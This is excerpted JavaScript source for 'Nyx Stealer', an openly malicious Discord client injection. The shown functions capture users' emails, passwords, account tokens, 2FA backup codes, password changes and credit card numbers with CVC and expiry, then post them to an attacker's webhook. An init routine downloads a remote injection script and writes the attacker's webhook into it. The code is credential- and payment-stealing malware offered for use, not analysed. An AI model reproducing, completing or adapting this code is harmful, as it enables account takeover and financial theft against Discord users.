...
const hooker = async (content, token, account) => {
    ...
    content["username"] = "Nyx Stealer Discord Injection";
    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1185265069798465626/1270140493078069309/nyxstealer.png?ex=67e12e43&is=67dfdcc3&hm=a4cdc45696b43b66f6da097c68f63790937c3a451756256e062faa12f32389b8&";
    ...
    content["embeds"][0]["footer"] = {
        "text": "Nyx Stealer Discord Injection",
        "icon_url": "https://cdn.discordapp.com/attachments/1185265069798465626/1270140493078069309/nyxstealer.png?ex=67e12e43&is=67dfdcc3&hm=a4cdc45696b43b66f6da097c68f63790937c3a451756256e062faa12f32389b8&",
    };
        ...
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    ...
                    break;
                case 2:
                    billing += '<:paypal:1318981837514866760> ';
                    break;
            }
        }
    });
...
const EmailPassToken = async (email, password, token, action) => {
    ...
    const content = {
        "content": `**${account.username}** ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + email + "`",
...
const BackupCodesViewed = async (codes, token) => {
    ...
    const content = {
        "content": `**${account.username}** Viewed His 2FA Codes!`,
        "embeds": [{
            "fields": [{
                    "name": "Backup Codes",
                    "value": "```" + message + "```",
...
const PasswordChanged = async (newPassword, oldPassword, token) => {
    ...
    const content = {
        "content": `**${account.username}** Changed His Password!`,
        "embeds": [{
            "fields": [{
                "name": "New Password",
                "value": "`" + newPassword + "`",
...
const CreditCardAdded = async (number, cvc, month, year, token) => {
    ...
    const content = {
        "content": `**${account.username}** Added A Card!`,
        "embeds": [{
            "fields": [{
                "name": "Number",
                "value": "`" + number + "`",
...
async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        ...
        const content = {
            "content": `**${account.username}** Got Injected`,
  ...
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          ...
          res.replace('REPLACE_ME', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
